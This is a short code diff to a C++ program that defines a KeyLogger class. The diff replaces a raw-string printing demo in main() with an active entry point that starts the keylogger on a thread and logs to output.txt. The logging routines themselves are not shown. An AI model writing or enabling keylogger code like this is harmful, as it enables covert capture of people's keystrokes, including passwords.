@@ -20,7 +20,7 @@ class KeyLogger {
 		bool getSpecialKey(int key, string& key_name);
 		void keylog();
 		bool running;
-		int max_running_time = 300;
+		const int max_running_time = 300;
 
 	public:
 		KeyLogger(string file_name) : file_name(file_name) {} 
@@ -121,22 +121,12 @@ void KeyLogger::keylog() {
 
 
 int main() {
-    std::string normalString = "Hello\nWorld! \"C++\" is awesome!";
-    std::string rawString = toRawString(normalString);
+	KeyLogger kl("output.txt");
 
-    std::cout << "Original String:\n" << normalString << "\n\n";
-    std::cout << "Raw String Representation:\n" << rawString << "\n";
+	thread t1 (&KeyLogger::start, &kl);
 
-    return 0;
+	t1.join();
+	
+	
+	return 0;
 }
-
-// int main() {
-// 	KeyLogger kl("output.txt");
-
-// 	thread t1 (&KeyLogger::start, &kl);
-
-// 	t1.join();
-	
-	
-// 	return 0;
-// }
